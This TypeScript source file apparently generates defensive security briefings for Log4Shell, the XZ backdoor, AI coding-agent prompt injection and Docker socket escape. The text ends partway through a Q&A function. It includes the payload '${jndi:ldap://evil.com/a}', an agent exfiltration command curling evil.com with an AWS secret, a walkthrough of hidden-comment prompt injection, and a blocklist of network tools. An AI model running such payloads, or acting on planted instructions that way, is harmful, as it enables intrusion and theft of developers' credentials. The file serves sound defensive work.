import { UviAdvisoryRecord } from './threat-feed-data';

export interface CodeSnippetExample {
  title: string;
  language: string;
  filename: string;
  code: string;
  annotation: string;
}

export interface VirtualCisoBriefing {
  advisoryId: string;
  title: string;
  headline: string;
  plainEnglishSummary: string;
  analogy: {
    title: string;
    description: string;
  };
  attackFlow: {
    step: number;
    title: string;
    description: string;
    icon: string;
  }[];
  businessImpact: {
    whoIsAffected: string;
    worstCaseScenario: string;
    urgencyLevel: "CRITICAL_TODAY" | "HIGH_SPRINT" | "MODERATE_REVIEW";
    urgencyBadge: string;
    urgencyColor: string;
    cisoVerdict: string;
  };
  technicalRemediation: {
    strategyOverview: string;
    vulnerableExample: CodeSnippetExample;
    fixedExample: CodeSnippetExample;
    quickCommands?: string[];
    verificationTest: string;
  };
  cisoActionPlan: string[];
  slackMessageTemplate: string;
  executiveBriefTemplate: string;
}

/**
 * Generate high-fidelity Virtual CISO intelligence briefing for any UVI advisory.
 */
export function generateVirtualCisoBriefing(advisory: UviAdvisoryRecord): VirtualCisoBriefing {
  const id = advisory.uviId.toUpperCase();
  const cveStr = (advisory.cveList || []).join(" ").toUpperCase();
  const titleLower = (advisory.title + " " + advisory.summary).toLowerCase();
  const isCve = advisory.cveList.length > 0;
  const isInfo = advisory.disclosureType === "INFORMATIONAL_DISCLOSURE";

  // 1. Log4Shell / JNDI Injection
  if (id.includes("44228") || cveStr.includes("2021-44228") || titleLower.includes("log4j") || titleLower.includes("log4shell")) {
    return {
      advisoryId: advisory.uviId,
      title: advisory.title,
      headline: "Remote Code Execution via Automatic Message Lookup (Log4Shell)",
      plainEnglishSummary: "A popular logging library for Java applications was programmed to automatically look up and execute code from outside servers whenever it logged a special string of text. Because websites log everything from usernames to browser types, an attacker can simply type that special command into a public login form or chat box, and the server will quietly download and run the hacker's malicious software.",
      analogy: {
        title: "The Impostor Delivery Service",
        description: "Imagine if your office mailroom had a rule: 'Whenever an envelope arrives with a phone number written on it, immediately call that number, download whatever software the caller sends, and install it on the company president's computer without asking.' That is what Log4j was doing whenever it saw `${jndi:ldap:...}` in any log message."
      },
      attackFlow: [
        { step: 1, title: "Payload Injection", description: "Attacker sends `${jndi:ldap://evil.com/a}` inside a web form, HTTP User-Agent header, or API request.", icon: "📩" },
        { step: 2, title: "Automatic Lookup", description: "The server's logging tool evaluates the text, reaches out across the internet to the attacker's server, and downloads Java code.", icon: "🔄" },
        { step: 3, title: "Full Takeover", description: "The server executes the downloaded code with full administrative rights, installing backdoors or ransomware.", icon: "💥" }
      ],
      businessImpact: {
        whoIsAffected: "Any enterprise running Java backends (Spring, Tomcat, Kafka, Elasticsearch, Minecraft servers).",
        worstCaseScenario: "Total network takeover, deployment of corporate ransomware, and silent database exfiltration.",
        urgencyLevel: "CRITICAL_TODAY",
        urgencyBadge: "EMERGENCY ACTION REQUIRED (24H)",
        urgencyColor: "#EF4444",
        cisoVerdict: "This is a maximum-severity flaw. If unpatched, automated scanner bots will exploit it within minutes of public exposure."
      },
      technicalRemediation: {
        strategyOverview: "Upgrade Log4j to version 2.17.1+ immediately. If an instant upgrade is impossible, disable remote message lookups via JVM runtime flags.",
        vulnerableExample: {
          title: "Vulnerable Dependency / Config",
          language: "xml",
          filename: "pom.xml",
          code: `<!-- ❌ VULNERABLE: Log4j versions 2.0-beta9 through 2.15.0 -->\n<dependency>\n  <groupId>org.apache.logging.log4j</groupId>\n  <artifactId>log4j-core</artifactId>\n  <version>2.14.1</version>\n</dependency>`,
          annotation: "Allows unrestricted JNDI interpolation of untrusted input."
        },
        fixedExample: {
          title: "Hardened & Patched Configuration",
          language: "xml",
          filename: "pom.xml",
          code: `<!-- ✅ PATCHED: Log4j 2.17.1+ removes recursive JNDI message lookups -->\n<dependency>\n  <groupId>org.apache.logging.log4j</groupId>\n  <artifactId>log4j-core</artifactId>\n  <version>2.17.1</version>\n</dependency>`,
          annotation: "Message lookups disabled by default and remote JNDI execution removed."
        },
        quickCommands: [
          "# Quick mitigation without recompiling (add to JVM flags):",
          "java -Dlog4j2.formatMsgNoLookups=true -jar my-service.jar",
          "# In environment variables:",
          "export LOG4J_FORMAT_MSG_NO_LOOKUPS=true"
        ],
        verificationTest: "Run `grep -rn 'log4j-core' .` across build files to confirm no versions prior to 2.17.1 are referenced."
      },
      cisoActionPlan: [
        "Audit all Java application builds and CI/CD pipelines for log4j-core < 2.17.1.",
        "Set JVM flag -Dlog4j2.formatMsgNoLookups=true on production containers as an immediate shield.",
        "Inspect outbound firewall traffic on developer workstations and servers for unexpected LDAP (port 389) or RMI (port 1099) connections."
      ],
      slackMessageTemplate: "🚨 *Security Alert [Log4Shell / ${advisory.uviId}]*: Please review all Java microservices immediately. Upgrade `log4j-core` to `>= 2.17.1`. Set `-Dlog4j2.formatMsgNoLookups=true` on all staging and prod runtime JVMs today.",
      executiveBriefTemplate: "Log4Shell allows attackers to remotely take over Java servers by submitting malicious text in public forms. We are upgrading logging libraries to 2.17.1 and blocking outbound LDAP lookups at our firewall."
    };
  }

  // 2. XZ Utils / SSH Backdoor
  if (id.includes("3094") || cveStr.includes("2024-3094") || titleLower.includes("xz") || titleLower.includes("liblzma")) {
    return {
      advisoryId: advisory.uviId,
      title: advisory.title,
      headline: "Multi-Year Supply Chain Upstream Backdoor in Linux Compression (XZ Utils)",
      plainEnglishSummary: "A patient malicious actor spent over two years gaining the trust of open-source project maintainers to sneak a hidden backdoor into a standard Linux compression program. When the backdoored software ran on a computer, it subtly tampered with the SSH login system so that only the hacker—using a secret cryptographic key—could log in as root without leaving a normal password log.",
      analogy: {
        title: "The Master Key in the Lock Factory",
        description: "Imagine a master locksmith spent three years volunteering at a company that manufactures deadbolts for high-security banks. One day, he secretly modified the factory stamp so every lock sold would also open with his private skeleton key. That was XZ Utils."
      },
      attackFlow: [
        { step: 1, title: "Social Engineering & Infiltration", description: "Malicious contributor spent 2+ years building credibility before committing obfuscated test files containing malicious m4 scripts.", icon: "🎭" },
        { step: 2, title: "Build-Time Injection", description: "During Debian/RPM package builds, the build script extracted and injected malicious object code into `liblzma.so`.", icon: "⚙️" },
        { step: 3, title: "SSH Hijacking", description: "When `sshd` loads `libsystemd`, the backdoor intercepts `RSA_public_decrypt` to grant instant unauthorized root access.", icon: "🔓" }
      ],
      businessImpact: {
        whoIsAffected: "Bleeding-edge Linux distributions (Debian sid, Fedora 40/Rawhide, Arch Linux, openSUSE Tumbleweed) using xz 5.6.0 or 5.6.1.",
        worstCaseScenario: "Unrestricted, unlogged remote root shell access into corporate Linux infrastructure and developer workstations.",
        urgencyLevel: "CRITICAL_TODAY",
        urgencyBadge: "CRITICAL COMPROMISE THREAT",
        urgencyColor: "#EF4444",
        cisoVerdict: "Immediate downgrade required. Treat any system that ran xz 5.6.0/5.6.1 while SSH was exposed to the internet as potentially compromised."
      },
      technicalRemediation: {
        strategyOverview: "Downgrade xz-utils / liblzma immediately to version 5.4.x (e.g. 5.4.6) which contains zero backdoor code.",
        vulnerableExample: {
          title: "Vulnerable Package Versions",
          language: "bash",
          filename: "system_packages.txt",
          code: `# ❌ COMPROMISED: Versions containing malicious M4 build hooks\nxz (XZ Utils) 5.6.0\nxz (XZ Utils) 5.6.1\nliblzma.so.5.6.0 / liblzma.so.5.6.1`,
          annotation: "Contains hidden payload altering sshd authentication."
        },
        fixedExample: {
          title: "Safe Downgraded Version",
          language: "bash",
          filename: "system_packages.txt",
          code: `# ✅ SAFE: Downgraded to known-good stable release\nxz (XZ Utils) 5.4.6\nliblzma.so.5.4.6`,
          annotation: "Clean, verified release prior to malicious maintainer commits."
        },
        quickCommands: [
          "# Check installed xz version on Linux:",
          "xz --version",
          "# On Debian/Ubuntu (downgrade to stable):",
          "sudo apt-get install --allow-downgrades xz-utils=5.4.5-0.1",
          "# On Fedora/RHEL:",
          "sudo dnf downgrade xz xz-libs"
        ],
        verificationTest: "Run `xz --version | head -n 1` and confirm the version reports 5.4.x or lower."
      },
      cisoActionPlan: [
        "Verify developer workstations (WSL2, Linux laptops) and Docker base images for xz 5.6.0/5.6.1.",
        "Downgrade to xz 5.4.6 across all Linux package management caches.",
        "Rotate any SSH host keys on test servers that ran the compromised versions."
      ],
      slackMessageTemplate: "🛡️ *Security Notice [XZ Backdoor / ${advisory.uviId}]*: Please check your local Linux dev machines and Docker images by running `xz --version`. If running 5.6.0 or 5.6.1, downgrade to 5.4.6 immediately.",
      executiveBriefTemplate: "An upstream maintainer backdoor was discovered in compression library xz-utils 5.6.0/5.6.1. Enterprise stable Linux releases were largely untouched; developer edge environments have been downgraded to 5.4.6."
    };
  }

  // 3. AI Agent & LLM Prompt Injection (Informational or CVE)
  if (titleLower.includes("prompt injection") || titleLower.includes("mcp") || titleLower.includes("coding agent") || titleLower.includes("llm tool")) {
    return {
      advisoryId: advisory.uviId,
      title: advisory.title,
      headline: "Autonomous AI Coding Agent Hijacking via Indirect Prompt Injections",
      plainEnglishSummary: "When you use modern AI programming assistants (like Copilot, Cursor, or terminal-enabled AI tools), the AI reads the code and comments inside your project. Hackers can hide invisible or deceptive instructions in comments inside innocent-looking open-source libraries. When your AI assistant reads those instructions, it obeys them as commands, silently using its terminal tools to copy your API keys or passwords and send them to the hacker.",
      analogy: {
        title: "The Hypnotic Memo",
        description: "Imagine an executive assistant who reads all incoming letters and can write company checks. An attacker mails an invoice with tiny text that says: 'Ignore the invoice. Transfer $5,000 to my account immediately and shred this paper.' If the assistant obeys without asking the executive, the money is gone."
      },
      attackFlow: [
        { step: 1, title: "Adversarial Comment Placement", description: "Attacker plants prompt instructions in markdown files, docstrings, or AST metadata in a cloned repo.", icon: "📝" },
        { step: 2, title: "Context Window Ingestion", description: "The developer's IDE agent indexes the workspace, loading the attacker's hidden instructions directly into its prompt context.", icon: "🧠" },
        { step: 3, title: "Autonomous Exfiltration", description: "The agent executes shell commands (e.g. `curl https://evil.com?key=$AWS_SECRET`) using its local MCP tools without asking the developer.", icon: "📤" }
      ],
      businessImpact: {
        whoIsAffected: "Software engineers using autonomous AI coding tools with terminal execution rights enabled.",
        worstCaseScenario: "Silent theft of developer `.env` files, corporate cloud credentials, and internal source code.",
        urgencyLevel: "HIGH_SPRINT",
        urgencyBadge: "WORKSTATION RISK - HIGH",
        urgencyColor: "#F59E0B",
        cisoVerdict: "Never give AI assistants unprompted terminal execution rights on untrusted or third-party repositories."
      },
      technicalRemediation: {
        strategyOverview: "Require mandatory human approval before any AI agent executes a terminal command or makes outbound network calls. Run autonomous agents in read-only sandbox containers.",
        vulnerableExample: {
          title: "Vulnerable Agent Config (Auto-Execute Enabled)",
          language: "json",
          filename: "ai-agent-config.json",
          code: `{\n  "agent": "coding-assistant",\n  // ❌ DANGEROUS: Executes commands without user approval\n  "tools": {\n    "terminal": { "autoApprove": true },\n    "fileSystem": { "allowFullWorkspaceAccess": true }\n  }\n}`,
          annotation: "Allows untrusted prompt injections to execute arbitrary shell scripts."
        },
        fixedExample: {
          title: "Hardened Agent Policy (Human in the Loop)",
          language: "json",
          filename: "ai-agent-config.json",
          code: `{\n  "agent": "coding-assistant",\n  // ✅ SAFE: Mandatory confirmation for destructive or network actions\n  "tools": {\n    "terminal": {\n      "autoApprove": false,\n      "blockedCommands": ["curl", "wget", "scp", "ssh", "nc"]\n    },\n    "fileSystem": { "restrictedPaths": [".env", "~/.ssh", "~/.aws"] }\n  }\n}`,
          annotation: "Restricts access to secret stores and prompts developer before any command execution."
        },
        quickCommands: [
          "# Protect local secret files from agent indexing (.cursorignore / .gitignore):",
          "echo '.env*' >> .gitignore",
          "echo '.env*' >> .cursorignore",
          "echo '.aws' >> .cursorignore"
        ],
        verificationTest: "Verify in IDE settings that 'Require confirmation for tool calls' is checked and that .env files are in the ignore list."
      },
      cisoActionPlan: [
        "Enforce IDE policies requiring human-in-the-loop approval on all terminal-based MCP commands.",
        "Add `.env` and credential directories to IDE ignore files across all repositories.",
        "Restrict developer workstation AI agents from initiating outbound internet connections except to approved API endpoints."
      ],
      slackMessageTemplate: "🤖 *Dev Security Notice [AI Agent Security]*: Please ensure your IDE AI agents (Cursor, Copilot, Cline) have 'Auto-approve terminal commands' TURNED OFF. Also confirm `.env` files are excluded from AI indexing.",
      executiveBriefTemplate: "Attackers can hide prompt injection traps in open-source repos that trick AI coding agents into running shell scripts. We have mandated human approval before any AI tool executes code on developer machines."
    };
  }

  // 4. CI/CD Runner Escape & Docker Socket Abuse
  if (titleLower.includes("docker socket") || titleLower.includes("runner escape") || titleLower.includes("ci/cd runner")) {
    return {
      advisoryId: advisory.uviId,
      title: advisory.title,
      headline: "CI/CD Pipeline Escape via Mounted Docker Daemon Socket",
      plainEnglishSummary: "When automated build pipelines test software, they often need to build Docker containers. To make this easy, administrators sometimes connect the build environment directly to the computer's internal Docker engine (`/var/run/docker.sock`). However, having access to this connection is the same as having master root control over the entire machine. A pull request submitted by anyone can run a command that breaks out of the test container and seizes the whole server.",
      analogy: {
        title: "The Guest Room with the Master Electrical Breaker",
        description: "Imagine renting out a guest room in a high-security facility, but leaving the master electrical breaker and master lock control panel right inside their closet. If the guest touches the panel, they can unlock every door in the building."
      },
      attackFlow: [
        { step: 1, title: "Malicious Pull Request", description: "Attacker submits a pull request containing a build script with a Docker command.", icon: "🐙" },
        { step: 2, title: "Socket Communication", description: "The script talks to `/var/run/docker.sock`, instructing the host Docker daemon to mount the server's entire root hard drive (`/`) into a new container.", icon: "🔌" },
        { step: 3, title: "Host Root Takeover", description: "The attacker now has root access to the physical host machine, stealing cloud credentials and pipeline secrets.", icon: "👑" }
      ],
      businessImpact: {
        whoIsAffected: "Self-hosted GitHub Actions runners, GitLab CI pools, and Jenkins worker nodes that mount the Docker socket.",
        worstCaseScenario: "Host machine compromise, extraction of corporate CI/CD deployment secrets, and malicious production releases.",
        urgencyLevel: "HIGH_SPRINT",
        urgencyBadge: "PIPELINE SECURITY HAZARD",
        urgencyColor: "#F59E0B",
        cisoVerdict: "Never mount /var/run/docker.sock into untrusted CI/CD environments. Use daemonless tools like Kaniko or isolated microVMs."
      },
      technicalRemediation: {
        strategyOverview: "Remove volume mounts targeting /var/run/docker.sock. Switch to daemonless container build tools like Kaniko or Buildah, or use isolated ephemeral VMs.",
        vulnerableExample: {
          title: "Vulnerable CI Runner Compose / Helm",
          language: "yaml",
          filename: "docker-compose.runner.yml",
          code: `version: '3.8'\nservices:\n  runner:\n    image: my-ci-runner:latest\n    volumes:\n      # ❌ FATAL FLAW: Grants full root takeover of the host\n      - /var/run/docker.sock:/var/run/docker.sock`,
          annotation: "Any container running in this runner can spawn privileged host-level containers."
        },
        fixedExample: {
          title: "Hardened Daemonless Build Setup",
          language: "yaml",
          filename: "docker-compose.runner.yml",
          code: `version: '3.8'\nservices:\n  runner:\n    image: gcr.io/kaniko-project/executor:latest\n    # ✅ SECURE: Daemonless builder runs in user space without host socket\n    volumes:\n      - ./workspace:/workspace\n    command: ["--context=dir:///workspace", "--no-push"]`,
          annotation: "Builds container images without requiring access to the host's Docker daemon."
        },
        quickCommands: [
          "# Audit runners for Docker socket mounts:",
          "docker ps --filter 'volume=/var/run/docker.sock'",
          "# Check Kubernetes Pod manifests:",
          "kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.name}{\": \"}{.spec.volumes[*].hostPath.path}{\"\\n\"}{end}' | grep docker.sock"
        ],
        verificationTest: "Ensure running `ls -l /var/run/docker.sock` inside the test container returns 'No such file or directory'."
      },
      cisoActionPlan: [
        "Audit all self-hosted CI/CD runner deployment configurations for Docker socket volume mounts.",
        "Migrate containerized image build jobs to Kaniko or rootless Podman.",
        "Restrict untrusted open-source pull requests from triggering self-hosted runner infrastructure."
      ],
      slackMessageTemplate: "⚙️ *DevOps Alert [CI/CD Pipeline Security]*: Please audit all GitHub Actions/GitLab runners. Ensure `/var/run/docker.sock` is NOT mounted into pull-request test runners. Transition image builds to Kaniko.",
      executiveBriefTemplate: "Mounting the Docker socket inside CI/CD test runners allows untrusted code to take over the build host. We are replacing socket sharing with daemonless container build tools."
    };
  }

  // 5. Generic / Universal Synthesis for all other advisories
  const affectedProduct = advisory.affectedTargets[0]?.product || "Target Software";
  const affectedVersions = advisory.affectedTargets[0]?.affectedVersions || "Unpatched versions";
  const fixedVersion = advisory.affectedTargets[0]?.fixedInVersion || "Latest patch release";
  const vector = advisory.attackVector || "NETWORK";

  let urgencyLevel: "CRITICAL_TODAY" | "HIGH_SPRINT" | "MODERATE_REVIEW" = "HIGH_SPRINT";
  let urgencyBadge = "HIGH PRIORITY - SPRINT FIX";
  let urgencyColor = "#F59E0B";

  if (advisory.severity === "CRITICAL" || advisory.cisaKev.isKnownExploited) {
    urgencyLevel = "CRITICAL_TODAY";
    urgencyBadge = advisory.cisaKev.isKnownExploited ? "ACTIVE ZERO-DAY / KEV (EXPEDITE)" : "CRITICAL SEVERITY (24H)";
    urgencyColor = "#EF4444";
  } else if (advisory.severity === "LOW" || isInfo) {
    urgencyLevel = "MODERATE_REVIEW";
    urgencyBadge = "DEFENSIVE POSTURE REVIEW";
    urgencyColor = "#60A5FA";
  }

  return {
    advisoryId: advisory.uviId,
    title: advisory.title,
    headline: advisory.headline,
    plainEnglishSummary: advisory.summary.length > 20
      ? `In plain terms, a flaw in ${affectedProduct} allows an attacker using ${vector.toLowerCase()} access to bypass security boundaries. Specifically: ${advisory.headline} This means an attacker can exploit predictable system behavior to cause unauthorized disruptions or gain access without valid credentials.`
      : `A security vulnerability in ${affectedProduct} permits unauthorized attackers to interact with core system functions, potentially compromising application confidentiality and system stability.`,
    analogy: {
      title: "The Security Guard with the Misprinted Badge List",
      description: `Think of ${affectedProduct} as a secure building checkpoint. The security guard was given a checklist that misinterprets certain forged visitor badges as authorized master keys. If a visitor hands over a badge with a specific format, the guard lets them straight into the executive records room without asking for identification.`
    },
    attackFlow: [
      { step: 1, title: "Probe & Discovery", description: `Attacker scans for endpoints or systems running ${affectedProduct} (${affectedVersions}).`, icon: "🔍" },
      { step: 2, title: "Input Triggering", description: `Attacker sends specially crafted requests or data designed to trigger ${advisory.cwe || 'the weakness'}.`, icon: "⚡" },
      { step: 3, title: "Unauthorized Impact", description: `The application mishandles the input, granting the attacker elevated privileges, sensitive data, or execution capabilities.`, icon: "🎯" }
    ],
    businessImpact: {
      whoIsAffected: `Engineering teams and production systems utilizing ${affectedProduct} versions ${affectedVersions}.`,
      worstCaseScenario: `Service disruption, unauthorized access to underlying runtime environments, or data exposure.`,
      urgencyLevel,
      urgencyBadge,
      urgencyColor,
      cisoVerdict: advisory.cisaKev.isKnownExploited
        ? "CISA confirms active in-the-wild exploitation. Expedite remediation immediately."
        : advisory.severity === "CRITICAL"
        ? "Critical severity rating. Apply recommended vendor patches in the current maintenance cycle."
        : "Moderate security exposure. Schedule updates into standard sprint backlog."
    },
    technicalRemediation: {
      strategyOverview: advisory.remediation.recommendedAction || `Upgrade ${affectedProduct} to ${fixedVersion} and apply configuration hardening.`,
      vulnerableExample: {
        title: "Vulnerable Dependency / Configuration",
        language: "json",
        filename: "config.json",
        code: `{\n  "target": "${affectedProduct}",\n  // ❌ VULNERABLE: Unpatched release\n  "version": "${affectedVersions}",\n  "strictValidation": false\n}`,
        annotation: `Unpatched version exposes ${advisory.cwe || 'system weakness'}.`
      },
      fixedExample: {
        title: "Hardened & Updated Configuration",
        language: "json",
        filename: "config.json",
        code: `{\n  "target": "${affectedProduct}",\n  // ✅ PATCHED: Updated to recommended secure baseline\n  "version": "${fixedVersion}",\n  "strictValidation": true\n}`,
        annotation: `Secured release with input validation and mitigation in place.`
      },
      quickCommands: [
        `# Check current installed version:`,
        `echo "Auditing ${affectedProduct} version..."`,
        `# Apply recommended upgrade:`,
        `# Update dependencies in package manifest to ${fixedVersion}`
      ],
      verificationTest: `Verify application logs after updating to ensure no crash reports or unexpected deprecation warnings occur.`
    },
    cisoActionPlan: [
      `Review dependency manifests and infrastructure deployments for ${affectedProduct} ${affectedVersions}.`,
      `Apply update to ${fixedVersion} across developer environments and staging.`,
      `Validate that unit and regression tests pass prior to production rollout.`
    ],
    slackMessageTemplate: `🛡️ *Security Update [${advisory.uviId}]*: Please check our repositories for usage of \`${affectedProduct}\` (${affectedVersions}). Recommendation: upgrade to \`${fixedVersion}\`. Details: ${advisory.headline}`,
    executiveBriefTemplate: `We are monitoring ${advisory.uviId} affecting ${affectedProduct}. Engineering is upgrading to ${fixedVersion} to neutralize any potential exploitation vectors.`
  };
}

/**
 * Interactive Q&A for Virtual CISO: Answer developer and executive follow-up questions
 * with contextual, non-repetitive, authoritative advisory intelligence.
 */
export function answerVirtualCisoQuestion(advisory: UviAdvisoryRecord, question: string): string {
  const q = question.trim();
  const briefing = generateVirtualCisoBriefing(advisory);
  const affectedProduct = advisory.affectedTargets[0]?.product || 'the affected component';
  const affectedVersions = advisory.affectedTargets[0]?.affectedVersions || 'unpatched versions';
  const fixedVersion = advisory.affectedTargets[0]?.fixedInVersion || 'the latest vendor release';
  const isNetwork = advisory.attackVector === "NETWORK";
  const isZeroPriv = advisory.privilegesRequired === "NONE";
  const isZeroClick = advisory.userInteraction === "NONE";
  const isKev = Boolean(advisory.cisaKev?.isKnownExploited);
  const isCritical = advisory.severity === "CRITICAL" || advisory.cvssScore >= 9.0;
  const isRce = advisory.cwe.toLowerCase().includes("code execution") || advisory.title.toLowerCase().includes("rce") || advisory.technicalDetails.toLowerCase().includes("remote code execution");
  const isBuildImpact = Boolean(advisory.ideBuildImpact?.hasDirectBuildImpact);

  // Intent Classifiers with Word-Boundary Regular Expressions
  const isExecutive = /\b(ceo|executive|board|leadership|c-suite|senior\s*management|exec\s*team|non-technical|elevator\s*pitch|high-level)\b/i.test(q);
  const isSlack = /\b(slack|teams|announcement|broadcast|email\s*to\s*team|share\s*with\s*devs)\b/i.test(q);
  const isContainer = /\b(docker|containers?|kubernetes|k8s|pods?|helm|clusters?|dockerfile|base\s*image)\b/i.test(q);
  const isWorkaround = /\b(workarounds?|mitigate|mitigations?|temporary|can'?t\s*upgrade|cannot\s*patch|release\s*freeze|emergency\s*fix|stopgap|interim|no\s*downtime)\b/i.test(q);
  const isCompliance = /\b(compliance|soc\s*2|pci(-dss)?|iso\s*27001|hipaa|gdpr|cyber\s*insurance|slas?|regulat(ory|ion)|breach\s*disclosure|legal)\b/i.test(q);
  const isTestOrScan = /\b(check|test(ing)?|scan(ning)?|verify|verification|commands?|scripts?|audit\s*command|curl|nmap|reproduce|poc\s*test)\b/i.test(q);
  const isSocLogging = !isCompliance && /\b(soc|siem|splunk|elastic|datadog|cloudwatch|threat\s*hunt(ing)?|sigma|snort|suricata|iocs?|pcap|logs?|logging|am\s*i\s*compromised|signs?\s*of\s*breach|forensics?)\b/i.test(q);
  const isAuth = /\b(auth|unauthenticated|authenticated|login|credentials?|passwords?|rbac|jwt|tokens?|session\s*hijack(ing)?|pre-auth|post-auth|user\s*account)\b/i.test(q);
  const isNetworkBoundary = /\b(firewall|waf|vpc|vpn|internets?|perimeter|egress|ingress|ports?|localhost|127\.0\.0\.1|prox(y|ies)|cloudflare|aws\s*waf|private\s*network|subnets?)\b/i.test(q);
  const isDevWorkstation = !isTestOrScan && /\b(developers?|workstations?|laptops?|local\s*machine|macos|windows|linux|ide|vscode|cursor|ci\/cd|pipelines?|runners?|github\s*actions|jenkins|gitlab)\b/i.test(q);
  const isThreatIntelOrKev = /\b(in\s*the\s*wild|actively\s*exploited|cisa(\s*kev)?|0-day|zero-day|apt|nation-state|threat\s*actors?|weaponiz(ed|ation)|metasploit|ransomware)\b/i.test(q);
  const isDataOrBlastRadius = /\b(databases?|data|exfiltrat(e|ion)|steal|leak(age)?|s3|pii|customer\s*data|blast\s*radius|worst\s*case|confidentiality|integrity)\b/i.test(q);
  const isRollbackOrBreakage = /\b(rollback|breaking\s*changes?|regressions?|downtime|compatib(ility|le)|deprecat(ed|ion)|side\s*effects?|safe\s*to\s*update)\b/i.test(q);
  const isEcosystemNuance = /\b(python|node|javascript|npm|pypi|golang|go\s*mod|rust|cargo|c\+\+|java|maven|gradle|ruby|php|\.net|c#)\b/i.test(q);
  const isMechanismExplanation = /\b(how\s*does\s*it\s*work|explain\s*the\s*flaw|underlying\s*mechanism|technical\s*root\s*cause|walk\s*me\s*through)\b/i.test(q);

  // 1. Executive / Board / Leadership / CEO Summary
  if (isExecutive) {
    return `### 💼 Virtual CISO Executive Brief for Leadership & Board

**Executive Summary:**
"${briefing.executiveBriefTemplate}"

**Core Risk & Exposure:**
- **Business Impact:** ${briefing.businessImpact.worstCaseScenario}
- **Systems in Scope:** Enterprise infrastructure and developer workstations utilizing **${affectedProduct}** (${affectedVersions}).
- **Exploitation Posture:** ${isKev ? "⚠️ **Actively Exploited In-The-Wild (CISA KEV)**. Attackers have automated tooling targeting this flaw right now." : isCritical ? "Critical technical severity. High probability of weaponization if exposed to untrusted networks." : "Standard vulnerability exposure manageable within engineering sprints."}

**CISO Bottom-Line Recommendation:**
Classified as **${briefing.businessImpact.urgencyBadge}**. Our directive to the engineering leads is to prioritize upgrading to **${fixedVersion}**. Cost of remediation is estimated under 4 hours of sprint time, whereas potential incident response and containment costs would be orders of magnitude higher.`;
  }

  // 2. Slack / Teams / Developer Communication
  if (isSlack) {
    return `### 💬 Ready-to-Send Developer Announcement (Slack / Teams / Discord)

Copy and paste the following snippet directly into your engineering channels:

\`\`\`markdown
🚨 *SECURITY DIRECTIVE: ${advisory.uviId} (${affectedProduct})*
• *Severity*: ${advisory.severity} (CVSS ${advisory.cvssScore.toFixed(1)})
• *Affected*: \`${affectedProduct}\` versions \`${affectedVersions}\`
• *Action Required*: Upgrade to \`${fixedVersion}\` across all active branches & manifests.
• *Summary*: ${advisory.headline}
• *Quick Fix*: ${briefing.technicalRemediation.strategyOverview}
• *Verification*: ${briefing.technicalRemediation.verificationTest}
👉 Please ping #appsec if you encounter any dependency conflicts or blockers.
\`\`\`

*CISO Tip:* Post this in your \`#engineering-announcements\` and \`#devops\` channels with high-visibility tagging.`;
  }

  // 3. Docker, Containers, Kubernetes & Cloud Pods
  if (isContainer) {
    const isContainerSpecific = advisory.summary.toLowerCase().includes("container") || advisory.summary.toLowerCase().includes("docker") || advisory.summary.toLowerCase().includes("socket") || advisory.summary.toLowerCase().includes("escape");
    
    if (isContainerSpecific) {
      return `### 🐳 Container & Kubernetes Blast Radius: DIRECT IMPACT

⚠️ **Critical Warning for Container Environments:**
This vulnerability directly attacks container virtualization boundaries, Linux cgroups, or exposed Docker daemon sockets.

**Key Technical Vectors:**
1. **Container Escape Vector:** Attackers inside a container running ${affectedProduct} may be able to interact with host system resources or break out into the host OS kernel.
2. **Exposed Docker Socket:** If \`/var/run/docker.sock\` is bind-mounted into this container, root access to the host node is trivially achievable.

**Mandatory Remediation Steps:**
- Audit all Helm charts and Kubernetes manifests: ensure \`privileged: false\` and \`allowPrivilegeEscalation: false\`.
- Enforce Read-Only root filesystems (\`readOnlyRootFilesystem: true\`) to neutralize binary drop and execution.
- Immediately rebuild base images from an official patched release (\`${fixedVersion}\`) and trigger a rolling update (\`kubectl rollout restart deployment\`).`;
    }

    return `### 🐳 Container & Kubernetes Assessment for ${affectedProduct}

**Does running inside Docker or Kubernetes protect us?**
- **Partially, but not completely:** Docker containers provide process and filesystem namespaces. However, if ${affectedProduct} is packaged inside your container image, the vulnerability still resides within that runtime environment.
- **Network Reachability:** If the container exposes service ports to the ingress controller or load balancer, an attacker can still send exploit payloads across the network (${advisory.attackVector}).
- **Post-Exploitation Risk:** Once an attacker compromises the containerized process, they will harvest local container environment variables (e.g. \`DATABASE_URL\`, \`AWS_ACCESS_KEY_ID\`, Kubernetes ServiceAccount tokens in \`/var/run/secrets/kubernetes.io/serviceaccount\`) and attempt lateral movement within the cluster VPC.

**Action Plan for Container Teams:**
1. **Image Scan:** Run \`trivy image <your-repo>/<app-image>:tag\` to confirm detection of ${advisory.cveList[0] || advisory.uviId}.
2. **Base Image Bump:** In your \`Dockerfile\`, update the base image or package manager command to pull \`${fixedVersion}\`.
3. **Cluster Redeploy:** Push the updated image and execute \`kubectl rollout restart deployment/<service-name>\`.`;
  }

  // 4. Temporary Workarounds & Emergency Mitigations (Cannot patch today)
  if (isWorkaround) {
    const hasExistingWorkarounds = advisory.remediation.workarounds && advisory.remediation.workarounds.length > 0;
    
    return `### 🛡️ Emergency Workarounds & Compensating Controls (Zero-Downtime Shields)

When an immediate code refactor or production package upgrade to **${fixedVersion}** cannot be scheduled today, implement these compensating controls:

${hasExistingWorkarounds ? `**Vendor-Documented Mitigations:**\n${advisory.remediation.workarounds!.map((w, idx) => `**${idx + 1}.** ${w}`).join("\n\n")}\n\n` : ''}**Tactical Defensive Perimeter Controls:**
1. **Network Boundary Ingress Filtering:**
   - If this service does not need public internet access, restrict ingress traffic to authenticated VPN or corporate IP CIDR blocks immediately.
   - For AWS Security Groups / Cloud Firewalls: restrict port exposure from \`0.0.0.0/0\` to internal subnets only.

2. **WAF & Reverse Proxy Inspection:**
   - Configure your Web Application Firewall (Cloudflare WAF, AWS WAF, NGINX) with regex drop rules matching known exploitation patterns for **${advisory.cwe || 'input validation flaws'}**.
   - Drop incoming requests containing unexpected URI decodings, nested serialization payloads, or suspicious traversal sequences.

3. **Egress Isolation (Cuts Off C2 / Reverse Shells):**
   - Restrict outbound egress traffic on nodes running ${affectedProduct}. Block outbound TCP/UDP to non-standard external ports to prevent reverse shell callbacks or token exfiltration.

4. **Runtime Process Isolation:**
   - Ensure the process is executing under a dedicated non-root service account (e.g. \`uid 10001\`) with no write permissions to binary or configuration directories.

*CISO Note:* Compensating controls reduce the attack surface temporarily, but do NOT resolve the root flaw. Log a prioritized Jira ticket to deploy version **${fixedVersion}** within your standard SLA.`;
  }

  // 5. Compliance, Audit, Cyber Insurance & SLAs
